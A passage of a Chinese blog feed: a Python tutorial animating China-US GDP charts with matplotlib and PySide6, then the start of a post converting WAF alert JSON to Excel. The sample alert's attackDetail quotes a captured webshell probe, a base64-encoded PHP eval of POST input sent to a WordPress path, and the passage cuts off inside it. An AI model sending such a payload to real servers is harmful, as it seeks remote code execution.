(17,963,170,521,079)，我们需要将GDP的数据从文本中提取出来，也就是取括号中的数据。<br>这里通过正则表达式将括号中的GDP数据提取出来，并转换为亿元为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> locale</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">'\((\S*)\)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgdpvalue</span><span class="params">(gdpstr)</span>:</span></span><br><span class="line">    re_obj=pattern.search(gdpstr)</span><br><span class="line">    gdp_value=locale.atof(re_obj.group(<span class="number">1</span>))/<span class="number">100000000</span></span><br><span class="line">    <span class="keyword">return</span> gdp_value</span><br><span class="line">    </span><br><span class="line">df_data = pd.read_excel(<span class="string">'data\中国VS美国.xlsx'</span>)</span><br><span class="line">df_data = df_data.loc[<span class="number">1</span>:len(df_data)]</span><br><span class="line">df_data[<span class="string">'china_gdp_value'</span>] = df_data[<span class="string">'中国'</span>].map(getgdpvalue)</span><br><span class="line">df_data[<span class="string">'us_gdp_value'</span>] = df_data[<span class="string">'美国'</span>].map(getgdpvalue)</span><br><span class="line">df_data = df_data.sort_values(<span class="string">'年份'</span>)</span><br></pre></td></tr></table></figure><p>有了数据以后就可以通过数据绘图了。</p><h2 id="二、matplotlib绘图"><a href="#二、matplotlib绘图" class="headerlink" title="二、matplotlib绘图"></a>二、matplotlib绘图</h2><p>先通过matplotlib绘图看看数据的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(df_data[<span class="string">'年份'</span>],df_data[<span class="string">'china_gdp_value'</span>])</span><br><span class="line">plt.plot(df_data[<span class="string">'年份'</span>],df_data[<span class="string">'us_gdp_value'</span>])</span><br><span class="line">plt.title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">plt.xlabel(<span class="string">'年份'</span>)</span><br><span class="line">plt.ylim(<span class="string">'GDP（亿）'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/%E4%B8%AD%E7%BE%8EGDP%E8%B6%8B%E5%8A%BF.png" alt="中美GDP对比趋势"></p><p>可以看到中国的GDP数据在1960年至1990年都是比较平稳的，到了1990年后中国开始了爆发式的追赶模式。<br>我们要将这种趋势通过动态的方式展示出来。</p><h2 id="三、数据展示与动态更新"><a href="#三、数据展示与动态更新" class="headerlink" title="三、数据展示与动态更新"></a>三、数据展示与动态更新</h2><p>首先通过QMainWindw定义QWidget组件，在QWidget中加入FigureCanvasQTAgg组件通过canvas载入matplotlib绘图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationWindow</span><span class="params">(QMainWindow)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, parent=None,org_data=None)</span>:</span></span><br><span class="line">        QMainWindow.__init__(self, parent)</span><br><span class="line">        self.axes = <span class="literal">None</span></span><br><span class="line">        self.axis_china=<span class="literal">None</span></span><br><span class="line">        self.axis_us=<span class="literal">None</span></span><br><span class="line">        self.datacount=<span class="number">10</span></span><br><span class="line">        self.org_data = org_data</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Central widget</span></span><br><span class="line">        self._main = QWidget()</span><br><span class="line">        self.setCentralWidget(self._main)</span><br><span class="line">        <span class="comment"># Figure</span></span><br><span class="line">        self.canvas = FigureCanvasQTAgg(figure)</span><br><span class="line">        <span class="keyword">if</span> len(self.org_data) &gt; <span class="number">0</span>:</span><br><span class="line">            show_data = self.org_data[<span class="number">0</span>:self.datacount]</span><br><span class="line">            self.axes = self.canvas.figure.subplots()</span><br><span class="line">            self.axes.set_title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">            self.axis_china = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'china_gdp_value'</span>], label=<span class="string">'中国GDP'</span>)</span><br><span class="line">            self.axis_us = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'us_gdp_value'</span>], label=<span class="string">'美国GDP'</span>)</span><br><span class="line">            y_max = max(self.org_data[<span class="string">'us_gdp_value'</span>].max(), self.org_data[<span class="string">'china_gdp_value'</span>].max())</span><br><span class="line">            self.axes.set_ylabel(<span class="string">'GDP(亿元)'</span>)</span><br><span class="line">            self.axes.set_xlabel(<span class="string">'年份'</span>)</span><br><span class="line">            self.axes.set_ylim(<span class="number">0</span>, y_max)</span><br><span class="line">            self.axes.set_xlim(show_data[<span class="string">'年份'</span>].min(), show_data[<span class="string">'年份'</span>].max())</span><br><span class="line">            self.axes.legend(loc=<span class="string">"upper left"</span>)</span><br><span class="line">            self.axes.yaxis.set_major_locator(mticker.MultipleLocator(<span class="number">20000</span>))</span><br><span class="line">            self.axes.xaxis.set_major_locator(mticker.MultipleLocator(<span class="number">1</span>))</span><br><span class="line">            figure.tight_layout()  <span class="comment"># 自动调整子图参数，使之填充整个图像区域</span></span><br><span class="line">        <span class="comment"># 下拉框，选择模式 # ComboBox (combo_type)</span></span><br><span class="line">        self.combo_type = QComboBox()</span><br><span class="line">        self.combo_type.addItems([<span class="string">'自动播放'</span>, <span class="string">'手动播放'</span>])</span><br><span class="line">        <span class="comment"># Sliders</span></span><br><span class="line">        min_value = <span class="number">0</span></span><br><span class="line">        self.max_value = len(self.org_data)-cur_data_len</span><br><span class="line">        self.slider_update = QSlider(minimum=min_value, maximum=self.max_value, orientation=Qt.Horizontal) <span class="comment"># 滑动条</span></span><br><span class="line">        layout1 = QHBoxLayout()</span><br><span class="line">        layout1.addWidget(self.combo_type)</span><br><span class="line">        <span class="comment"># layout</span></span><br><span class="line">        layout2 = QVBoxLayout()</span><br><span class="line">        layout2.addWidget(self.canvas, <span class="number">88</span>)</span><br><span class="line">        layout2.addWidget(self.slider_update)</span><br><span class="line">        <span class="comment"># Main layout</span></span><br><span class="line">        layout = QVBoxLayout(self._main)</span><br><span class="line">        layout.addLayout(layout1)</span><br><span class="line">        layout.addLayout(layout2, <span class="number">100</span>)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line">        <span class="comment"># Signal and Slots connections</span></span><br><span class="line">        self.combo_type.currentTextChanged.connect(self.selecttype)</span><br><span class="line">        self.slider_update.valueChanged.connect(self.update_frequency)</span><br><span class="line">        self.autoslider()</span><br></pre></td></tr></table></figure><p>一种方式是通过QSlider组件，通过手动拉slider组件来实现数据的变化，一种通过QTimer组件自动让数据变化。</p><h3 id="1、QSlider组件，手动方式实现动态绘图"><a href="#1、QSlider组件，手动方式实现动态绘图" class="headerlink" title="1、QSlider组件，手动方式实现动态绘图"></a>1、QSlider组件，手动方式实现动态绘图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slot()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_frequency</span><span class="params">(self, new_val)</span>:</span></span><br><span class="line">    <span class="comment"># 偏移量每次偏移1</span></span><br><span class="line">    f = int(new_val)</span><br><span class="line">    offset = f + cur_data_len  <span class="comment"># 偏移刻度</span></span><br><span class="line">    show_data = self.org_data[f: offset]</span><br><span class="line">    x = show_data[<span class="string">'年份'</span>]</span><br><span class="line">    y_china = show_data[<span class="string">'china_gdp_value'</span>]</span><br><span class="line">    y_us = show_data[<span class="string">'us_gdp_value'</span>]</span><br><span class="line">    self.axes.set_xlim(x.min(), x.max())</span><br><span class="line">    self.axis_china[<span class="number">0</span>].set_data(x, y_china)</span><br><span class="line">    self.axis_us[<span class="number">0</span>].set_data(x, y_us)</span><br><span class="line">    self.canvas.draw()</span><br></pre></td></tr></table></figure><p>手动拉slider组件来实现数据的变化效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/showgdp-%E6%89%8B%E5%8A%A8.gif" alt="手动数据变化"></p><h3 id="2、QTimer组件，自动动态绘图"><a href="#2、QTimer组件，自动动态绘图" class="headerlink" title="2、QTimer组件，自动动态绘图"></a>2、QTimer组件，自动动态绘图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    self.autoslider()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoslider</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.timer = QTimer()</span><br><span class="line">    self.timer.setInterval(<span class="number">100</span>) <span class="comment"># 100毫秒更新一次数据</span></span><br><span class="line">    self.timer.timeout.connect(self.autoupdate) <span class="comment">#自动更新数据,每次更新偏移量加1，也就是跳一年的数据 </span></span><br><span class="line">    self.timer.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autoupdate</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.update_frequency(self.auto_offset)</span><br><span class="line">    self.slider_update.setSliderPosition(self.auto_offset)</span><br><span class="line">    <span class="keyword">if</span> self.auto_offset &lt; self.max_value:</span><br><span class="line">        self.auto_offset = self.auto_offset+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>效果如文章最前面所示。</p><h2 id="四、完整代码"><a href="#四、完整代码" class="headerlink" title="四、完整代码"></a>四、完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> locale</span><br><span class="line"><span class="keyword">import</span> matplotlib.ticker <span class="keyword">as</span> mticker</span><br><span class="line"><span class="keyword">from</span> PySide6.QtCore <span class="keyword">import</span> Qt, Slot, QTimer</span><br><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QMainWindow, QApplication, QVBoxLayout, QHBoxLayout, QWidget, QSlider, QComboBox</span><br><span class="line"><span class="keyword">from</span> matplotlib.backends.backend_qtagg <span class="keyword">import</span> FigureCanvasQTAgg</span><br><span class="line"><span class="keyword">from</span> matplotlib.figure <span class="keyword">import</span> Figure</span><br><span class="line"></span><br><span class="line">figure = Figure(figsize=(<span class="number">12</span>, <span class="number">6</span>), dpi=<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> cur_data_len, cur_major_locator</span><br><span class="line">cur_data_len = <span class="number">10</span>  <span class="comment"># 当前显示的数据量（显示10年的数据）</span></span><br><span class="line">cur_major_locator = <span class="number">10</span>  <span class="comment"># 当前刻度的定位器（主刻度）</span></span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">'\((\S*)\)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgdpvalue</span><span class="params">(gdpstr)</span>:</span></span><br><span class="line">    re_obj=pattern.search(gdpstr)</span><br><span class="line">    gdp_value=locale.atof(re_obj.group(<span class="number">1</span>))/<span class="number">100000000</span></span><br><span class="line">    <span class="keyword">return</span> gdp_value</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationWindow</span><span class="params">(QMainWindow)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, parent=None,org_data=None)</span>:</span></span><br><span class="line">        QMainWindow.__init__(self, parent)</span><br><span class="line">        self.axes = <span class="literal">None</span></span><br><span class="line">        self.axis_china=<span class="literal">None</span></span><br><span class="line">        self.axis_us=<span class="literal">None</span></span><br><span class="line">        self.datacount=<span class="number">10</span></span><br><span class="line">        self.org_data = org_data</span><br><span class="line">        self.auto_offset = <span class="number">0</span></span><br><span class="line">        <span class="comment"># Central widget</span></span><br><span class="line">        self._main = QWidget()</span><br><span class="line">        self.setCentralWidget(self._main)</span><br><span class="line">        <span class="comment"># Figure</span></span><br><span class="line">        self.canvas = FigureCanvasQTAgg(figure)</span><br><span class="line">        <span class="keyword">if</span> len(self.org_data) &gt; <span class="number">0</span>:</span><br><span class="line">            show_data = self.org_data[<span class="number">0</span>:self.datacount]</span><br><span class="line">            self.axes = self.canvas.figure.subplots()</span><br><span class="line">            self.axes.set_title(<span class="string">'中美GDP对比'</span>)</span><br><span class="line">            self.axis_china = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'china_gdp_value'</span>], label=<span class="string">'中国GDP'</span>)</span><br><span class="line">            self.axis_us = self.axes.plot(show_data[<span class="string">'年份'</span>], show_data[<span class="string">'us_gdp_value'</span>], label=<span class="string">'美国GDP'</span>)</span><br><span class="line">            y_max = max(self.org_data[<span class="string">'us_gdp_value'</span>].max(), self.org_data[<span class="string">'china_gdp_value'</span>].max())</span><br><span class="line">            self.axes.set_ylabel(<span class="string">'GDP(亿元)'</span>)</span><br><span class="line">            self.axes.set_xlabel(<span class="string">'年份'</span>)</span><br><span class="line">            self.axes.set_ylim(<span class="number">0</span>, y_max)</span><br><span class="line">            self.axes.set_xlim(show_data[<span class="string">'年份'</span>].min(), show_data[<span class="string">'年份'</span>].max())</span><br><span class="line">            self.axes.legend(loc=<span class="string">"upper left"</span>)</span><br><span class="line">            self.axes.yaxis.set_major_locator(mticker.MultipleLocator(<span class="number">20000</span>))</span><br><span class="line">            self.axes.xaxis.set_major_locator(mticker.MultipleLocator(<span class="number">1</span>))</span><br><span class="line">            figure.tight_layout()  <span class="comment"># 自动调整子图参数，使之填充整个图像区域</span></span><br><span class="line">        <span class="comment"># 下拉框，选择模式 # ComboBox (combo_type)</span></span><br><span class="line">        self.combo_type = QComboBox()</span><br><span class="line">        self.combo_type.addItems([<span class="string">'自动播放'</span>, <span class="string">'手动播放'</span>])</span><br><span class="line">        <span class="comment"># Sliders</span></span><br><span class="line">        min_value = <span class="number">0</span></span><br><span class="line">        self.max_value = len(self.org_data)-cur_data_len</span><br><span class="line">        self.slider_update = QSlider(minimum=min_value, maximum=self.max_value, orientation=Qt.Horizontal) <span class="comment"># 滑动条</span></span><br><span class="line">        layout1 = QHBoxLayout()</span><br><span class="line">        layout1.addWidget(self.combo_type)</span><br><span class="line">        <span class="comment"># layout</span></span><br><span class="line">        layout2 = QVBoxLayout()</span><br><span class="line">        layout2.addWidget(self.canvas, <span class="number">88</span>)</span><br><span class="line">        layout2.addWidget(self.slider_update)</span><br><span class="line">        <span class="comment"># Main layout</span></span><br><span class="line">        layout = QVBoxLayout(self._main)</span><br><span class="line">        layout.addLayout(layout1)</span><br><span class="line">        layout.addLayout(layout2, <span class="number">100</span>)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line">        <span class="comment"># Signal and Slots connections</span></span><br><span class="line">        self.combo_type.currentTextChanged.connect(self.selecttype)</span><br><span class="line">        self.slider_update.valueChanged.connect(self.update_frequency)</span><br><span class="line">        self.autoslider()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">autoslider</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.setInterval(<span class="number">100</span>) <span class="comment"># 100毫秒更新一次数据</span></span><br><span class="line">        self.timer.timeout.connect(self.autoupdate) <span class="comment">#自动更新数据,每次更新偏移量加1，也就是跳一年的数据</span></span><br><span class="line">        self.timer.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">autoupdate</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.update_frequency(self.auto_offset)</span><br><span class="line">        self.slider_update.setSliderPosition(self.auto_offset)</span><br><span class="line">        <span class="keyword">if</span> self.auto_offset &lt; self.max_value:</span><br><span class="line">            self.auto_offset = self.auto_offset+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.auto_offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @Slot()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selecttype</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'自动播放'</span> == text:</span><br><span class="line">            self.autoslider()</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'手动播放'</span> == text:</span><br><span class="line">            self.timer.stop()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @Slot()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_frequency</span><span class="params">(self, new_val)</span>:</span></span><br><span class="line">        <span class="comment"># 偏移量每次偏移1</span></span><br><span class="line">        f = int(new_val)</span><br><span class="line">        offset = f + cur_data_len  <span class="comment"># 偏移刻度</span></span><br><span class="line">        show_data = self.org_data[f: offset]</span><br><span class="line">        x = show_data[<span class="string">'年份'</span>]</span><br><span class="line">        y_china = show_data[<span class="string">'china_gdp_value'</span>]</span><br><span class="line">        y_us = show_data[<span class="string">'us_gdp_value'</span>]</span><br><span class="line">        self.axes.set_xlim(x.min(), x.max())</span><br><span class="line">        self.axis_china[<span class="number">0</span>].set_data(x, y_china)</span><br><span class="line">        self.axis_us[<span class="number">0</span>].set_data(x, y_us)</span><br><span class="line">        self.canvas.draw()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    locale.setlocale(locale.LC_ALL, <span class="string">'en_US.UTF-8'</span>)</span><br><span class="line">    df_data = pd.read_excel(<span class="string">'data\中国VS美国.xlsx'</span>)</span><br><span class="line">    df_data = df_data.loc[<span class="number">1</span>:len(df_data)]</span><br><span class="line">    df_data[<span class="string">'china_gdp_value'</span>] = df_data[<span class="string">'中国'</span>].map(getgdpvalue)</span><br><span class="line">    df_data[<span class="string">'us_gdp_value'</span>] = df_data[<span class="string">'美国'</span>].map(getgdpvalue)</span><br><span class="line">    df_data = df_data.sort_values(<span class="string">'年份'</span>)</span><br><span class="line">    w = ApplicationWindow(org_data=df_data)</span><br><span class="line">    w.setFixedSize(<span class="number">1000</span>, <span class="number">500</span>)</span><br><span class="line">    w.show()</span><br><span class="line">    app.exec()</span><br></pre></td></tr></table></figure><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>Python实现matplotlib动态绘图，是非常简单和容易的，其实关键还是在数据的组织，也就是要准备好要绘图的坐标轴的x的数据和y的数据，通过set_data(x,y)来动态更新数据，要注意的是变化的数据后X轴或Y轴的显示要变化，这里可以通过轴的set_xlim()或set_ylim()方法来动态设置，刻度也可通过set_major_locator()来指定。</p><p>数据集见 <a href="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/中国VS美国.xlsx" target="_blank" rel="noopener">https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/中国VS美国.xlsx</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着中国的各种实力的提高，经常在各种媒体上看到中国与各个国家历年的各种指标数据的对比，为了更清楚的展示历年的发展趋势，有的还做成了动图，看到中国各种指标数据的近年的不断逆袭，心中的自豪感油然而生。今天通过Python来实现matplotlib的动态绘图，将中美两国近年的GD
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python三行代码实现json转Excel</title>
    <link href="https://xiejava.gitee.io/posts/213c546f/"/>
    <id>https://xiejava.gitee.io/posts/213c546f/</id>
    <published>2023-08-18T06:33:33.000Z</published>
    <updated>2023-08-18T06:39:21.232Z</updated>
    
    <content type="html"><![CDATA[<p>最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。<br>用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。<br>实现如下：</p><h2 id="一、引包"><a href="#一、引包" class="headerlink" title="一、引包"></a>一、引包</h2><p>引入pandas包，pandas写excel依赖openpyxl包所以也到导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas </span><br><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure><h2 id="二、代码"><a href="#二、代码" class="headerlink" title="二、代码"></a>二、代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">json_data=<span class="string">r'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   "msg": "",</span></span><br><span class="line"><span class="string">   "killChain": "02",</span></span><br><span class="line"><span class="string">   "attackIllustration": "1起恶意盲打木马写入攻击",</span></span><br><span class="line"><span class="string">   "traceSourceFlag": "01",</span></span><br><span class="line"><span class="string">   "riskLevel": "02",</span></span><br><span class="line"><span class="string">   "holeType": "",</span></span><br><span class="line"><span class="string">   "discoveryTime": "2023-08-15 14:36:23",</span></span><br><span class="line"><span class="string">   "disposalMeasure": "01",</span></span><br><span class="line"><span class="string">   "informationSource": "长亭WAF",</span></span><br><span class="line"><span class="string">   "disposalSuggestion": "建议封禁",</span></span><br><span class="line"><span class="string">   "riskLevelPredue": "",</span></span><br><span class="line"><span class="string">   "impactFlag": "02",</span></span><br><span class="line"><span class="string">   "disposalOperateRecord": "WAF封禁",</span></span><br><span class="line"><span class="string">   "serialNo": "ABC123",</span></span><br><span class="line"><span class="string">   "sourceIpBelong": "美国",</span></span><br><span class="line"><span class="string">   "potentialImpact": "无",</span></span><br><span class="line"><span class="string">   "sourceIpType": "04",</span></span><br><span class="line"><span class="string">   "protocalType": "HTTP",</span></span><br><span class="line"><span class="string">   "disposalFlag": "01",</span></span><br><span class="line"><span class="string">   "groupOrderType": "1",</span></span><br><span class="line"><span class="string">   "comment": "通过微步溯源，IP归属地是美国",</span></span><br><span class="line"><span class="string">   "attackDetail": "POST //wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw== HTTP/1.1\n\nHost: abcd.cn\n\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n\nUser-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\n\nAccept-Language: en-US,en;q=0.9,fr;q=0.8\n\nCache-Control: max-age=0\n\nreferer: www.google.com\n\nUpgrade-Insecure-Requests: 1\n\nContent-Length: 231\n\nContent-Type: 